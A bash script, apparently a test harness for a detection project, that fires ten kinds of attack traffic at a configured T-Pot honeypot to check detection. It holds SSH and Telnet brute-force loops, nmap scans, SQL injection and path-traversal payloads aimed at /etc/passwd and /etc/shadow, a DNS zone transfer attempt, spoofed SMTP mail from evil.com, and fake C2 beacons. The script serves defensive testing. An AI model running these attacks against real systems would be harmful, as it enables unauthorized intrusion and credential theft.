#!/bin/bash
# ========================================================================
# Live Honeypot Attack Suite
# Performs real attacks against the Azure T-Pot honeypot
# ========================================================================

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Load environment configuration
ENV_FILE="$(dirname "${BASH_SOURCE[0]}")/../backend/.env"
if [ -f "$ENV_FILE" ]; then
    export $(grep -v '^#' "$ENV_FILE" | xargs)
fi

TPOT_IP="${TPOT_HOST:-}"

if [ -z "$TPOT_IP" ]; then
    echo -e "${RED}❌ T-Pot IP not configured in .env${NC}"
    echo -e "${YELLOW}Please set TPOT_HOST in backend/.env${NC}"
    exit 1
fi

# Attack configuration
ATTACK_DELAY=2  # Seconds between attack types
EVENT_DELAY=1   # Seconds between individual events

echo -e "${BOLD}${BLUE}"
echo "╔════════════════════════════════════════════════════════════════╗"
echo "║                                                                ║"
echo "║           LIVE HONEYPOT ATTACK SUITE                          ║"
echo "║                                                                ║"
echo "║  Testing real-time attack detection and response              ║"
echo "║                                                                ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo -e "${NC}\n"

echo -e "${YELLOW}⚠️  Target Honeypot: ${BOLD}$TPOT_IP${NC}"
echo -e "${CYAN}ℹ️  This will generate real attack traffic${NC}"
echo -e "${CYAN}ℹ️  Ensure Mini-XDR backend is running to capture events${NC}"
echo ""
read -p "Press Enter to continue or Ctrl+C to cancel..."
echo ""

ATTACK_COUNT=0
SUCCESS_COUNT=0

# Function to print attack header
print_attack() {
    ATTACK_COUNT=$((ATTACK_COUNT + 1))
    echo -e "\n${PURPLE}═══════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${PURPLE}[ATTACK $ATTACK_COUNT] $1${NC}"
    echo -e "${PURPLE}═══════════════════════════════════════════════════════${NC}\n"
}

# ========================================================================
# ATTACK 1: SSH Brute Force (High Volume)
# ========================================================================
print_attack "SSH Brute Force - High Volume"
echo -e "${BLUE}Attempting 20 rapid SSH login failures...${NC}"

for i in {1..20}; do
    echo -e "${CYAN}  Attempt $i/20...${NC}"
    timeout 2 sshpass -p "wrongpass$i" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=2 -o UserKnownHostsFile=/dev/null \
        "attacker$i@$TPOT_IP" -p 22 2>/dev/null || true
    sleep $EVENT_DELAY
done

echo -e "${GREEN}✅ SSH brute force attack completed${NC}"
SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
sleep $ATTACK_DELAY

# ========================================================================
# ATTACK 2: Distributed Port Scan
# ========================================================================
print_attack "Distributed Port Scan"
echo -e "${BLUE}Scanning all common service ports...${NC}"

if command -v nmap &> /dev/null; then
    echo -e "${CYAN}Using nmap for comprehensive scan...${NC}"
    nmap -Pn -sS -p- --max-retries 1 --host-timeout 30s "$TPOT_IP" 2>/dev/null || true
    echo -e "${GREEN}✅ Nmap scan complete${NC}"
else
    echo -e "${CYAN}Using netcat for port scan...${NC}"
    COMMON_PORTS=(21 22 23 25 53 80 110 143 443 445 1433 3306 3389 5432 8080 8443)
    
    for port in "${COMMON_PORTS[@]}"; do
        echo -e "${CYAN}  Scanning port $port...${NC}"
        timeout 1 nc -zv "$TPOT_IP" "$port" 2>/dev/null || true
        sleep 0.5
    done
    echo -e "${GREEN}✅ Port scan complete${NC}"
fi

SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
sleep $ATTACK_DELAY

# ========================================================================
# ATTACK 3: HTTP/Web Reconnaissance
# ========================================================================
print_attack "HTTP/Web Reconnaissance"
echo -e "${BLUE}Probing web services for vulnerabilities...${NC}"

WEB_PATHS=(
    "/"
    "/admin"
    "/login"
    "/phpmyadmin"
    "/wp-admin"
    "/administrator"
    "/../../../etc/passwd"
    "/shell.php"
    "/cmd.php"
    "/.env"
    "/.git/config"
    "/backup.sql"
)

for path in "${WEB_PATHS[@]}"; do
    echo -e "${CYAN}  Probing: $path${NC}"
    curl -s -o /dev/null --max-time 3 "http://$TPOT_IP$path" 2>/dev/null || true
    curl -s -o /dev/null --max-time 3 "https://$TPOT_IP$path" 2>/dev/null || true
    sleep 0.5
done

echo -e "${GREEN}✅ Web reconnaissance complete${NC}"
SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
sleep $ATTACK_DELAY

# ========================================================================
# ATTACK 4: Telnet Brute Force
# ========================================================================
print_attack "Telnet Brute Force Attack"
echo -e "${BLUE}Attempting Telnet authentication...${NC}"

TELNET_CREDS=(
    "admin:admin"
    "root:root"
    "admin:password"
    "root:toor"
    "admin:12345"
)

for cred in "${TELNET_CREDS[@]}"; do
    username="${cred%%:*}"
    password="${cred##*:}"
    echo -e "${CYAN}  Trying $username:$password${NC}"
    
    (
        sleep 1
        echo "$username"
        sleep 1
        echo "$password"
        sleep 1
        echo "exit"
    ) | timeout 5 telnet "$TPOT_IP" 23 2>/dev/null || true
    
    sleep $EVENT_DELAY
done

echo -e "${GREEN}✅ Telnet brute force complete${NC}"
SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
sleep $ATTACK_DELAY

# ========================================================================
# ATTACK 5: FTP Enumeration
# ========================================================================
print_attack "FTP Enumeration & Authentication"
echo -e "${BLUE}Enumerating FTP service...${NC}"

if command -v ftp &> /dev/null; then
    # Try anonymous login
    echo -e "${CYAN}  Attempting anonymous FTP...${NC}"
    timeout 5 ftp -n "$TPOT_IP" 21 << EOF 2>/dev/null || true
user anonymous
pass anonymous@domain.com
ls
quit
EOF
    
    # Try common credentials
    FTP_USERS=("admin" "root" "ftp" "user")
    for user in "${FTP_USERS[@]}"; do
        echo -e "${CYAN}  Trying user: $user${NC}"
        timeout 5 ftp -n "$TPOT_IP" 21 << EOF 2>/dev/null || true
user $user
pass $user
quit
EOF
        sleep 1
    done
else
    echo -e "${CYAN}  Using netcat for FTP probe...${NC}"
    timeout 5 nc "$TPOT_IP" 21 << EOF 2>/dev/null || true
USER anonymous
PASS anonymous@
QUIT
EOF
fi

echo -e "${GREEN}✅ FTP enumeration complete${NC}"
SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
sleep $ATTACK_DELAY

# ========================================================================
# ATTACK 6: SQL Injection Attempts (Web)
# ========================================================================
print_attack "SQL Injection Attempts"
echo -e "${BLUE}Testing for SQL injection vulnerabilities...${NC}"

SQL_PAYLOADS=(
    "' OR '1'='1"
    "admin' --"
    "' OR '1'='1' /*"
    "1' UNION SELECT NULL--"
    "'; DROP TABLE users--"
)

for payload in "${SQL_PAYLOADS[@]}"; do
    encoded=$(printf %s "$payload" | jq -sRr @uri)
    echo -e "${CYAN}  Testing payload: ${payload:0:20}...${NC}"
    
    curl -s -o /dev/null --max-time 3 \
        "http://$TPOT_IP/login?username=$encoded&password=test" 2>/dev/null || true
    
    sleep 0.5
done

echo -e "${GREEN}✅ SQL injection testing complete${NC}"
SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
sleep $ATTACK_DELAY

# ========================================================================
# ATTACK 7: Directory Traversal
# ========================================================================
print_attack "Directory Traversal Attack"
echo -e "${BLUE}Attempting directory traversal...${NC}"

TRAVERSAL_PATHS=(
    "../../etc/passwd"
    "../../../etc/shadow"
    "....//....//....//etc/passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd"
    "..\\..\\..\\windows\\win.ini"
)

for path in "${TRAVERSAL_PATHS[@]}"; do
    echo -e "${CYAN}  Trying: $path${NC}"
    curl -s -o /dev/null --max-time 3 \
        "http://$TPOT_IP/index.php?page=$path" 2>/dev/null || true
    sleep 0.5
done

echo -e "${GREEN}✅ Directory traversal complete${NC}"
SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
sleep $ATTACK_DELAY

# ========================================================================
# ATTACK 8: DNS Enumeration
# ========================================================================
print_attack "DNS Enumeration"
echo -e "${BLUE}Performing DNS reconnaissance...${NC}"

if command -v dig &> /dev/null; then
    echo -e "${CYAN}  DNS ANY query...${NC}"
    dig ANY @"$TPOT_IP" 2>/dev/null || true
    
    echo -e "${CYAN}  DNS zone transfer attempt...${NC}"
    dig AXFR @"$TPOT_IP" 2>/dev/null || true
else
    echo -e "${CYAN}  Using nslookup for DNS probe...${NC}"
    nslookup "$TPOT_IP" "$TPOT_IP" 2>/dev/null || true
fi

echo -e "${GREEN}✅ DNS enumeration complete${NC}"
SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
sleep $ATTACK_DELAY

# ========================================================================
# ATTACK 9: SMTP Enumeration
# ========================================================================
print_attack "SMTP Enumeration & Spoofing"
echo -e "${BLUE}Probing SMTP service...${NC}"

echo -e "${CYAN}  Attempting SMTP connection...${NC}"
timeout 5 nc "$TPOT_IP" 25 << EOF 2>/dev/null || true
HELO attacker.com
MAIL FROM: <attacker@evil.com>
RCPT TO: <victim@target.com>
DATA
Subject: Phishing Test
This is a test email from honeypot attack suite
.
QUIT
EOF

echo -e "${GREEN}✅ SMTP enumeration complete${NC}"
SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
sleep $ATTACK_DELAY

# ========================================================================
# ATTACK 10: Multi-Stage APT Simulation
# ========================================================================
print_attack "Multi-Stage APT Simulation"
echo -e "${BLUE}Simulating advanced persistent threat...${NC}"

echo -e "${CYAN}Stage 1: Initial Reconnaissance${NC}"
nmap -sV -O --max-retries 1 "$TPOT_IP" 2>/dev/null || true
sleep 2

echo -e "${CYAN}Stage 2: Vulnerability Exploitation${NC}"
for i in {1..5}; do
    timeout 2 ssh -o ConnectTimeout=2 "root@$TPOT_IP" -p 22 2>/dev/null || true
    sleep 1
done

echo -e "${CYAN}Stage 3: Malware Download Simulation${NC}"
curl -s -o /dev/null --max-time 3 \
    -H "User-Agent: Malware-Downloader/1.0" \
    "http://$TPOT_IP/malware.exe" 2>/dev/null || true

echo -e "${CYAN}Stage 4: C2 Communication Simulation${NC}"
curl -s -o /dev/null --max-time 3 \
    -H "X-C2-Beacon: infected-host-001" \
    -H "X-Session-ID: apt-campaign-2024" \
    "http://$TPOT_IP/beacon" 2>/dev/null || true

echo -e "${GREEN}✅ APT simulation complete${NC}"
SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
sleep $ATTACK_DELAY

# ========================================================================
# Summary
# ========================================================================
echo -e "\n${BOLD}${GREEN}"
echo "╔════════════════════════════════════════════════════════════════╗"
echo "║                                                                ║"
echo "║              ATTACK SUITE COMPLETE! ✅                         ║"
echo "║                                                                ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo -e "${NC}\n"

echo -e "${BLUE}📊 Attack Summary:${NC}"
echo -e "  • Total attack types executed: ${GREEN}$ATTACK_COUNT${NC}"
echo -e "  • Successful attacks: ${GREEN}$SUCCESS_COUNT${NC}"
echo -e "  • Target honeypot: ${CYAN}$TPOT_IP${NC}"
echo ""

echo -e "${BLUE}🔍 Next Steps:${NC}"
echo -e "  1. Check Mini-XDR dashboard: ${CYAN}http://localhost:3000${NC}"
echo -e "  2. Review incidents: ${CYAN}http://localhost:8000/incidents${NC}"
echo -e "  3. Analyze ML predictions: ${CYAN}http://localhost:8000/api/ml/status${NC}"
echo -e "  4. Review backend logs: ${CYAN}tail -f backend/backend.log${NC}"
echo -e "  5. Check T-Pot logs: ${CYAN}https://$TPOT_IP:64297${NC}"
echo ""

echo -e "${YELLOW}💡 Attack Types Executed:${NC}"
echo "  1. SSH Brute Force (20 attempts)"
echo "  2. Port Scan (16+ ports)"
echo "  3. Web Reconnaissance (12+ paths)"
echo "  4. Telnet Brute Force (5 credentials)"
echo "  5. FTP Enumeration"
echo "  6. SQL Injection (5 payloads)"
echo "  7. Directory Traversal (5 patterns)"
echo "  8. DNS Enumeration"
echo "  9. SMTP Probing"
echo " 10. Multi-Stage APT"
echo ""

echo -e "${GREEN}${BOLD}🎯 Now run the comprehensive test suite to verify detection:${NC}"
echo -e "${CYAN}  cd tests && python3 comprehensive_azure_honeypot_test.py${NC}"
echo ""

